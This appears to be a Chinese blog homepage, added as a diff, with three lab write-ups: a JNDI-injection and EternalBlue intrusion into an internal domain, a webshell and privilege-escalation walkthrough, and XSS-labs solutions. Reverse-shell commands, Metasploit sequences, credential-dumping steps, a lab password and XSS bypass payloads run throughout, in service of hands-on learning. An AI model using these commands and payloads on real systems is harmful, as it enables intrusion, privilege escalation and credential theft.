@@ -1,0 +1,459 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta property="og:type" content="website">
+<meta property="og:title" content="懒大王的主场">
+<meta property="og:url" content="http://example.com/index.html">
+<meta property="og:site_name" content="懒大王的主场">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="Sanyer">
+<meta name="twitter:card" content="summary"><title>懒大王的主场</title><link ref="canonical" href="http://example.com/index.html"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">懒大王的主场</div><div class="header-banner-info__subtitle">懒大王专场，舔羊勿进</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/06/22/%E5%AE%9E%E9%AA%8C%E4%BA%8C/">实验二</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-06-22</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-06-22</span></span></div></header><div class="post-body"><div class="post-excerpt"><p><img src="https://tva3.sinaimg.cn/large/008gHraJly8h3gu15s2mnj30mw05ymy0.jpg" alt="img"></p>
+<p>先通过nmap进行主机扫描，扫到了192.168.1.101然后使用nmap -v -Pn -T3 -sV -n -sT –open -p 1-60000  192.168.1.101 进行一些端口扫码</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h3gu2o20boj30w302u74w.jpg" alt="img"></p>
+<p>扫描后发现，存在38080端口，通过浏览器进行访问38080端口</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h3gu9hq4lnj30qb07qdha.jpg" alt="img"></p>
+<p>把这些内容复制百度一下，第一个就是问<strong>springboot出现Whitelabel Error Page This application has no explicit mapping for &#x2F;error解决方案</strong></p>
+<p>很容易得知是springboot，然后可能存在(CVE-2022-22965)，首先我没使用JNDIScan进行检测，如果存在呢漏洞，会收到请求</p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h3guqk3wywj31390kw0ww.jpg" alt="img"></p>
+<p>我们使用这个样子的payload：${jndi:ldap:&#x2F;&#x2F;ip:端口&#x2F;}</p>
+<p><img src="https://tva3.sinaimg.cn/large/008gHraJly8h3guyk25ajj30mi099752.jpg" alt="img"></p>
+<p>注意：需要在&#x2F;hello页面才行<img src="https://tva3.sinaimg.cn/large/008gHraJly8h3guzyixnsj30iz0gl41d.jpg" alt="img"></p>
+<p>我们发现有反应，存在漏洞。利用漏洞利用工具生成命令，</p>
+<p>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C “bash -c {echo,base64编码后的命令}|{base64,-d}|{bash,-i}” -A “kail的地址”</p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h3gv7rpmr3j315r0fcjwv.jpg" alt="img"></p>
+<p>开启监听8001端口，然后执行payload</p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h3gvh1sbbmj30ai02t74d.jpg" alt="img"></p>
+<p><img src="https://tva4.sinaimg.cn/large/008gHraJly8h3gvi17ne1j30gt06x0t5.jpg" alt="img"></p>
+<p>在kail中获取到</p>
+<p><img src="https://tva3.sinaimg.cn/large/008gHraJly8h3gvijm6rrj30gy06ut9n.jpg" alt="img"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h3gvjm3vqxj30hu0803z9.jpg" alt="img"></p>
+<p>在靶机中发现flag并有疑似账号密码，由于之前已知22端口开放，所以直接尝试连接，</p>
+<p>通过ifcong发现，存在两个网卡，其中一个ip地址为10.0.1.6，代表其应该存在内网</p>
+<p>通过编写命令进行内网ip扫描</p>
+<p><img src="https://tva4.sinaimg.cn/large/008gHraJly8h3gvp4s09sj306r01fmx3.jpg" alt="img"></p>
+<p>发现存在10.0.1.7，准备对其进行攻击。</p>
+<p>我们将frp放置在Ubuntu中。rsync -av frp_0.43.0_linux_amd64 <span class="exturl"><a class="exturl__link"   href="mailto:&#x73;&#x61;&#117;&#x6c;&#x40;&#x31;&#57;&#50;&#x2e;&#x31;&#x36;&#x38;&#46;&#x31;&#46;&#x31;&#x30;&#x31;" >&#x73;&#x61;&#117;&#x6c;&#x40;&#x31;&#57;&#50;&#x2e;&#x31;&#x36;&#x38;&#46;&#x31;&#46;&#x31;&#x30;&#x31;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>:&#x2F;tmp （写入需要权限，tmp有写的权限，所以可以使用）</p>
+<p>接下来修改kail与unubtu中的配置文件。</p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h3gw87bp1wj30ll0h6q4o.jpg" alt="img"></p>
+<p>建议先在kail改完再传，没用vim属实难受</p>
+<p>现在kail上执行sudo .&#x2F;frps -c frps.ini</p>
+<p><img src="https://tva3.sinaimg.cn/large/008gHraJly8h3h5bnp8m4j30r5057jt9.jpg" alt="img"></p>
+<p>之后在Ubuntu执行.&#x2F;frpc -c frpc.ini <strong>注意这两个命令长得不一样，调用的也不一样</strong></p>
+<p><img src="https://tva4.sinaimg.cn/large/008gHraJly8h3h5lisv27j30q1033403.jpg" alt="img"></p>
+<p>接下来我们打开msf设置反向代理</p>
+<p>msf6 &gt; setg Proxies socks5:192.168.1.103:1088</p>
+<p>msf6 &gt; setg ReverseAllowProxy true</p>
+<p>扫描10.0.1.7是否开启了smb服务</p>
+<p>msf6 &gt; use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_version</p>
+<p> msf6 auxiliary(scanner&#x2F;smb&#x2F;smb_version) &gt; set RhOSTS 10.0.1.7</p>
+<p>msf6 auxiliary(scanner&#x2F;smb&#x2F;smb_version) &gt; run看图说话，存在</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h3h5uouokhj30zi054jt7.jpg" alt="img"></p>
+<p>探测是否存在MS17-010漏洞</p>
+<p>msf6 auxiliary(scanner&#x2F;smb&#x2F;smb_version) &gt; use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010</p>
+<p>msf6 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; show options </p>
+<p>msf6 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; set RHOSTS 10.0.1.7</p>
+<p>msf6 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; run</p>
+<p><img src="https://tva3.sinaimg.cn/large/008gHraJly8h3h5vm84v9j315h07f416.jpg" alt="img"></p>
+<p>再次看图说话，存在那我们使用这个<strong>永恒之蓝</strong>漏洞</p>
+<p>msf6 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</p>
+<p> exploit(windows&#x2F;smb&#x2F;ms17_010_eternalblue) &gt; show options（单纯瞅一眼）</p>
+<p>f6 exploit(windows&#x2F;smb&#x2F;ms17_010_eternalblue) &gt; set RHOSTS 10.0.1.7</p>
+<p>msf6 exploit(windows&#x2F;smb&#x2F;ms17_010_eternalblue) &gt; show options</p>
+<p>msf6 exploit(windows&#x2F;smb&#x2F;ms17_010_eternalblue) &gt; run</p>
+<p>运行之后发现有问题，把方式更换成bind</p>
+<p><img src="https://tva3.sinaimg.cn/large/008gHraJly8h3h9e0sap6j30uj0440tx.jpg" alt="img"></p>
+<p>msf6 exploit(windows&#x2F;smb&#x2F;ms17_010_eternalblue) &gt; set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp</p>
+<p>msf6 exploit(windows&#x2F;smb&#x2F;ms17_010_eternalblue) &gt; run</p>
+<p>然后直接进入，并拿到system权限</p>
+<p><img src="https://tva4.sinaimg.cn/large/008gHraJly8h3h9gwh0bjj30ue0cm772.jpg" alt="img"></p>
+<p>meterpreter &gt; load kiwi</p>
+<p>meterpreter &gt; creds_all</p>
+<p>跑出密码的哈希或明文密码（需要登录之后才能抓到）</p>
+<p>通过shell打开cmd运行虚拟终端，通过ipconfig发现还有一张网卡</p>
+<p><img src="https://tva3.sinaimg.cn/large/008gHraJly8h3h9vbhzk7j30ug0mcwia.jpg" alt="img"></p>
+<p>C:\Windows\system32&gt;net time &#x2F;domain</p>
+<p><img src="https://tva4.sinaimg.cn/large/008gHraJly8h3ha0zqxzqj30mr03cdga.jpg" alt="img"></p>
+<p>\DC所以我们通过ping这个DC去找域控主机ip</p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h3ha2dt4onj30n206zdh4.jpg" alt="img"></p>
+<p>得到ip地址为10.0.0.12</p>
+<p>meterpreter &gt; background把会话放在后台</p>
+<p> 使用MSF添加一个Socks</p>
+<p>msf6 exploit(windows&#x2F;smb&#x2F;ms17_010_eternalblue) &gt; use auxiliary&#x2F;server&#x2F;socks_proxy</p>
+<p>msf6 auxiliary(server&#x2F;socks_proxy) &gt; run</p>
+<p>msf6 auxiliary(server&#x2F;socks_proxy) &gt; jobs</p>
+<p>添加之后返回之前那个会话</p>
+<p>通过msf6 auxiliary(server&#x2F;socks_proxy) &gt; sessions查看之前有哪个会话</p>
+<p>msf6 auxiliary(server&#x2F;socks_proxy) &gt; sessions 1切换到之前的会话</p>
+<p><img src="C:\Users\88537\AppData\Roaming\Typora\typora-user-images\image-20220622201904083.png" alt="image-20220622201904083"></p>
+<p>meterpreter &gt; run autoroute -s 10.0.0.7&#x2F;24添加路由信息</p>
+<p>然后可以不再理msf</p>
+<p>更改配置文件&#x2F;etc&#x2F;proxychains.conf </p>
+<p><img src="https://tva4.sinaimg.cn/large/008gHraJly8h3hcjzwdbbj30mv09dgmm.jpg" alt="img"></p>
+<p>使用sam_the_admin.py获取shell</p>
+<p>proxychains python3 sam_the_admin.py “redteam&#x2F;root:Red12345” -dc-ip 10.0.0.12 -shell</p>
+<p>注意：一次操作获得后不要用Ctrl+c终止操作。有几率无法第二次连接</p>
+<p><img src="https://tva4.sinaimg.cn/large/008gHraJly8h3hclmx9x6j30qr05ut9l.jpg" alt="img"></p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/06/20/%E5%AE%9E%E9%AA%8C%E4%B8%80/">实验一</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-06-20</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-06-21</span></span></div></header><div class="post-body"><div class="post-excerpt"><p><strong>一、首先先把这个机器的ip地址扫出来才能进行后续操作</strong></p>
+<p><img src="https://tva3.sinaimg.cn/bmiddle/008gHraJly8h3f1iy92s9j30jn0c2dgs.jpg" alt="img"></p>
+<p>可以用nmap 192.168.xx.0&#x2F;24扫描也可以用这个进行扫描。按理说nmap更专业一点，我属于是有点毛病了，但是nmap会扫出来很多，这个扫出来的会比较少（找的时候会容易，我也不知道为啥会少）用nmap的也就是挨个去试扫出来的IP，不知道密码的靶场肯定就得玩文件上传了。</p>
+<p>二.<strong>找到文件上传的地方</strong></p>
+<p>涉及到网址的话，就把Burpsuite打开就行了。</p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h3f1nhpdogj30my0c676o.jpg" alt="img"></p>
+<p>进网站之后会发现这些东西，能看懂的就看，看不懂的就点击就好了，</p>
+<p>首先我们看到了一个user什么玩意，用户使用的地方有可能存在问题。</p>
+<p><img src="https://tva3.sinaimg.cn/large/008gHraJly8h3f1p592a3j30st0f7dgj.jpg" alt="img"></p>
+<p>点完之后果然到了一个登录界面，我们会发现他是有验证码的。那我们很明显不是很好去爆破，那我们先去猜一两个试一试，不行果断放弃之间注册一个账户看看。</p>
+<p>登录之后会发现有一个东西叫做更换头像。欸。。。是不是很兴奋，但是经过操作，我并没有成功上传上去。然后sql注入我也并没有发现，所以就不在这浪费时间了。从这个页面退出去，进入SiteServer。</p>
+<p>我们发现这是一个管理员后台，瞬间兴奋。尝试猜密码<img src="https://tva1.sinaimg.cn/large/008gHraJly8h3f1uzlu9fj30tt0erdhv.jpg" alt="img"></p>
+<p>我运气不好，猜了两次没猜对。很难受，但其实很好猜，就是admin123.如果猜对的话就巨省事，这里是有这么一个弱口令和业务逻辑漏洞的。</p>
+<p>我们点击忘记密码，输入admin后他让回答问题那我们肯定不知道回答啥啊。</p>
+<p>我们在这里进行抓包</p>
+<p><img src="https://tva4.sinaimg.cn/large/008gHraJly8h3f1ybq2n2j30pd0avwh9.jpg" alt="img"></p>
+<p>这里会有一个answer，其实在之前的猜测过程中，发现这里其实是不能为空的，他要求必须填。那么我们是不是把answer变成空的时候就能成功呢？注意是<strong>空</strong>不是<strong>空格</strong>就直接把输入的东西删掉。</p>
+<p><img src="https://tva4.sinaimg.cn/large/008gHraJly8h3f213twmmj30bm0akglz.jpg" alt="img"></p>
+<p>发现这个东西就出来了，登录就好了。进入之后就一顿乱找，发现一个叫做<strong>“站点模板管理”</strong>就很熟悉。我们尝试把webshell打成压缩包进行上传。</p>
+<p>（注意webshell的格式，这个网站的后缀都是aspx所以一定要用蚁剑生成aspx的shell，不然传上php也没用）</p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h3f24o7lusj30h200nwec.jpg" alt="img"></p>
+<p>上传的时候我们要抓一下包，看看能不能找到上传路径，找到绝对目录的话就会很舒服。发现并没有直接告诉存在哪里。但是他这个referer就很可以，这个名字太长了感觉很可能就是upload到这个文件。</p>
+<p>我们去寻找<img src="https://tva1.sinaimg.cn/large/008gHraJly8h3f2ibq40kj30d60pdgo9.jpg" alt="img"></p>
+<p>在我找了许久之后发现，这里居然有个站点文件管理。这不是纯纯的自爆了嘛，直接找到上传的shell1和shell2（找不到就又传了一个瞅瞅有没有路径）</p>
+<p>这个蚁剑生成的shell有点毛病，用不太明白，直接搜一个一句话比较舒服。换完shell成功登录。</p>
+<p><strong>三、提权与获取密码</strong></p>
+<p>利用虚拟终端发现权限是nt authority\network service，这啥用没有，就得提权了。</p>
+<p>利用msf生成木马，msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;kail的ip地址 LPORT&#x3D;4444 -f exe -o hackshell.exe</p>
+<p>通过webshell将这个木马上传，然后开启msf的监听</p>
+<p>msfconsole；use exploit&#x2F;multi&#x2F;handle；SET LHOST kail的IP；SET PAYLOAD windows&#x2F;meterpreter&#x2F;reverse_tcp；exploit；</p>
+<p>依次执行上面的命令，然后就开启了监听。</p>
+<p>通过webshell的虚拟终端，输入hackshell.exe启动木马</p>
+<p>发现kail有回显。</p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h3f3r4esoqj30tu047my9.jpg" alt="img"></p>
+<p>在这里我们使用烂土豆进行提权，其他也行但是我找了好久也没找到好用的。烂土豆对这个机器有奇效，</p>
+<p>我们先use incognito然后才能调用一些命令。之后通过list_tokens -u看一下有哪些令牌。发现一个比一个惨，权限低的都可怜</p>
+<p><img src="https://tva3.sinaimg.cn/large/008gHraJly8h3f3ttbti8j30ky062my8.jpg" alt="img"></p>
+<p>execute -c -H -f .&#x2F;potato.exe运行烂土豆</p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h3f3wdy690j30kn08975s.jpg" alt="img"></p>
+<p>再次查看令牌，system出来了，直接模仿impersonate_token “NT AUTHORITY\SYSTEM”</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h3f3xoxp0cj30l703s75d.jpg" alt="img"></p>
+<p>getuid后发现，已经是SYSTEM权限了，接下来就可以为所欲为了。</p>
+<p>输入shell，进入cmd。使用net user mybb 123.qqq &#x2F;add创建一个为mybb密码为123.qqq的用户，别问为啥是123.qqq因为他的密码规则要求复杂。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h3f44dw47qj30k3055gm8.jpg" alt="img"></p>
+<p>net user 看一下新建的账户，我就想知道，这个🐕东西到底对这个电脑做了什么，怎么这么多用户。</p>
+<p>net localgroup administrators mybb &#x2F;add 把新建的用户变成管理员。</p>
+<p>输入exit从cmd退出来，输入run getgui -e开启3389端口。我们尝试进行远程连接，发现连不上。</p>
+<p>发现他是有域的，需要在账户名前面加上W80ms&#x2F;变成W80ms&#x2F;mybb，然后输入密码就能上去了。</p>
+<p>hash也好拿，直接通过msf输入hashdump，全部拿下。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h3f4i5kh1aj30ob07l78q.jpg" alt="img"></p>
+<p>然后把administrator的后半截拿下来afffeba176210fad4628f0524bfe1942，上网cmd5解密。直接得出密码为123.com</p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h3f4jschlpj30oj08gq3i.jpg" alt="img"></p>
+<p>kiwi_cmd “privilege:debug” “sekurlsa::logonpasswords”</p>
+<p>creds_all</p>
+<p>在msf中利用这两个发现根本跑不出来明文密码，</p>
+<p>因为那个Administration账户并没有进行过登录，所以无法拿到明文密码，只有登录过的账户才有可能抓取到明文密码</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/04/21/xsslabs/">xsslabs</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-04-21</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-06-21</span></span></div></header><div class="post-body"><div class="post-excerpt">
+        <h1 id="level1"   >
+          <a href="#level1" class="heading-link"><i class="fas fa-link"></i></a><a href="#level1" class="headerlink" title="level1"></a>level1</h1>
+      <p>第一关相对来说简单，看到上面有个name&#x3D;。所以我们把后面改成语句测试。成功</p>
+<p><img src="https://tva4.sinaimg.cn/large/008gHraJly8h1hm34j15tj30nu0hogme.jpg" alt="img"></p>
+
+        <h1 id="Level2"   >
+          <a href="#Level2" class="heading-link"><i class="fas fa-link"></i></a><a href="#Level2" class="headerlink" title="Level2"></a>Level2</h1>
+      <p>第二关，我们直接在输入框输入后行不通。右键看一下网页代码</p>
+<p>我们会发现，我们输入的标点变成了 实体码，他这里是用了一个函数。我没只需要把这个函数闭合掉就行了</p>
+<p>闭合的方式从这里找</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=&quot;&lt;script&gt;alert(&#x27;a&#x27;)&lt;/script&gt;&quot;&gt;</span><br></pre></td></tr></table></div></figure>
+
+<p>他后面比咱输入的多了一个”&gt;很明显了</p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h1hm4h7kxyj30ov0dvgno.jpg" alt="img"></p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h1hm8u4v1nj30t00gy0tw.jpg" alt="img"></p>
+
+        <h1 id="level3"   >
+          <a href="#level3" class="heading-link"><i class="fas fa-link"></i></a><a href="#level3" class="headerlink" title="level3"></a>level3</h1>
+      <p>这个题就有点离谱了。他没有办法用&gt;去闭合掉那么只能换一个方式。我们用点击弹窗的方式输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;onclick=&#x27;alert(&#x27;a&#x27;)</span><br></pre></td></tr></table></div></figure>
+
+<p>这两个单引号都属为了去闭合。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h1hmgg44a1j30m30fsab8.jpg" alt="img"></p>
+
+        <h1 id="level4"   >
+          <a href="#level4" class="heading-link"><i class="fas fa-link"></i></a><a href="#level4" class="headerlink" title="level4"></a>level4</h1>
+      <p>我们直接用onclick来进行测试。毕竟它比较短。不行我们就右键看网页代码。发现他只是换成了双引号进行闭合</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h1hmjsfzpnj30ni0he3zq.jpg" alt="img"></p>
+
+        <h1 id="level5"   >
+          <a href="#level5" class="heading-link"><i class="fas fa-link"></i></a><a href="#level5" class="headerlink" title="level5"></a>level5</h1>
+      <p>我们测试后会发现，on变成了o_n不能用了。想大写绕，绕不过去，那我们再换一个方法，超链接<img src="https://tva3.sinaimg.cn/large/008gHraJly8h1hmnh748cj30pn0hb0u5.jpg" alt="img"></p>
+<p>我们再次拿捏</p>
+
+        <h1 id="level6"   >
+          <a href="#level6" class="heading-link"><i class="fas fa-link"></i></a><a href="#level6" class="headerlink" title="level6"></a>level6</h1>
+      <p>我还是用那个短的测试。发现又把on变了，我们继续尝试大写。成功</p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h1hmpkj0eoj30ny0h0ta7.jpg" alt="img"></p>
+
+        <h1 id="level7"   >
+          <a href="#level7" class="heading-link"><i class="fas fa-link"></i></a><a href="#level7" class="headerlink" title="level7"></a>level7</h1>
+      <p>继续测试、右键。发现on没了。那么我们尝试双写绕过。成功</p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h1hmrtdqglj30n60h43zm.jpg" alt="img"></p>
+
+        <h1 id="level8"   >
+          <a href="#level8" class="heading-link"><i class="fas fa-link"></i></a><a href="#level8" class="headerlink" title="level8"></a>level8</h1>
+      <p>这个是把你写的内容放到下面的连接里。我们直接尝试javascript:alert(1)发现script被处理了。</p>
+<p>我们尝试大写，他会自己变小。那我们通过转码进行绕过。<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://tool.oschina.net/encode" >https://tool.oschina.net/encode</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>转码后直接拿下。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h1hmzgqp2fj30py0hsjsp.jpg" alt="img"></p>
+
+        <h1 id="level9"   >
+          <a href="#level9" class="heading-link"><i class="fas fa-link"></i></a><a href="#level9" class="headerlink" title="level9"></a>level9</h1>
+      <p>根据经验，直接偷鸡，先把上一个的代码偷过来用一下。</p>
+<p>变成了一个非常离谱的东西。右键它告诉我们链接不合法。那我们如果是一个百度的链接呢，他还是不合法。但当把https改成http后合法了。说明它合法与否就是检测有没有http:&#x2F;&#x2F;</p>
+<p>但是当我们输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;http://</span><br></pre></td></tr></table></div></figure>
+
+<p>时直接无法跳转。这都是http惹的祸，只要把它注释掉就好了</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h1hn6ucekwj30pp0ha0u0.jpg" alt="img"></p>
+
+        <h1 id="level10"   >
+          <a href="#level10" class="heading-link"><i class="fas fa-link"></i></a><a href="#level10" class="headerlink" title="level10"></a>level10</h1>
+      <p>这个更…</p>
+<p>我们直接看啥都没有。就那一个破地址栏用烂了都没反应</p>
+<p>F12查看一下</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h1hn9g2n9vj30ak02lt8p.jpg" alt="img"></p>
+<p>这里藏仨东西受得了受不了啊</p>
+<p>我们从这三个下手。我的原则就是挑短的。按照132来。第一个没反应。</p>
+<p>那个引号还是用来闭合的。毕竟，如果是内容的话语句就没用了，就是单纯的句子了</p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h1hnehkorkj30sc0g50vg.jpg" alt="img"></p>
+
+        <h1 id="level11"   >
+          <a href="#level11" class="heading-link"><i class="fas fa-link"></i></a><a href="#level11" class="headerlink" title="level11"></a>level11</h1>
+      <p>发现，这个东西他又多了一个ref的隐藏。里面的内容是上一个题的链接。当我们尝试改变他的时候，他就会变成空的。</p>
+<p>我们需要把他抓包，才有可能改变它</p>
+<p>如果刚开始抓能抓到refererr，后来在抓就得自己加。当我们把抓到包里添加referer时，网页上的这个表情终于拿到了参数值。我们只需要把代码放在这里就好了</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">referer:&quot;onclick=&quot;alert(&#x27;a&#x27;)</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://tva3.sinaimg.cn/large/008gHraJly8h1ho8ag9pej30z20h4wgl.jpg" alt="img"></p>
+
+        <h1 id="level12"   >
+          <a href="#level12" class="heading-link"><i class="fas fa-link"></i></a><a href="#level12" class="headerlink" title="level12"></a>level12</h1>
+      <p>又多了一个，咱吸取经验直接抓包</p>
+<p>抓包后直接改。轻松秒杀</p>
+<p><img src="https://tva2.sinaimg.cn/bmiddle/008gHraJly8h1ho9rku49j30rq0f8ac4.jpg" alt="img"></p>
+
+        <h1 id="level13"   >
+          <a href="#level13" class="heading-link"><i class="fas fa-link"></i></a><a href="#level13" class="headerlink" title="level13"></a>level13</h1>
+      <p>cook盲猜一下肯定是cookie</p>
+<p>我们在cookie后面添加语句</p>
+<p><img src="https://tva3.sinaimg.cn/large/008gHraJly8h1hoe64h4qj30ru0gcq57.jpg" alt="img"></p>
+
+        <h1 id="level14"   >
+          <a href="#level14" class="heading-link"><i class="fas fa-link"></i></a><a href="#level14" class="headerlink" title="level14"></a>level14</h1>
+      
+        <h1 id="level15"   >
+          <a href="#level15" class="heading-link"><i class="fas fa-link"></i></a><a href="#level15" class="headerlink" title="level15"></a>level15</h1>
+      <p>ng-include 和之前文件上传中的include是差不多的</p>
+<p>14和15这俩题都有点毛病<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://158.247.233.5:25024/level15.php?src=1.gif%E6%8C%89%E7%90%86%E8%AF%B4%E4%BB%96%E5%BA%94%E8%AF%A5%E9%95%BF%E6%88%90%E8%BF%99%E6%A0%B7" >http://158.247.233.5:25024/level15.php?src=1.gif按理说他应该长成这样</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>src的值会传到</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;&lt;span class=&quot;ng-include:1.gif&quot;&gt;&lt;/span&gt;&lt;/body&gt;</span><br></pre></td></tr></table></div></figure>
+
+<p> ng-include后面</p>
+<p>直接包含第一关</p>
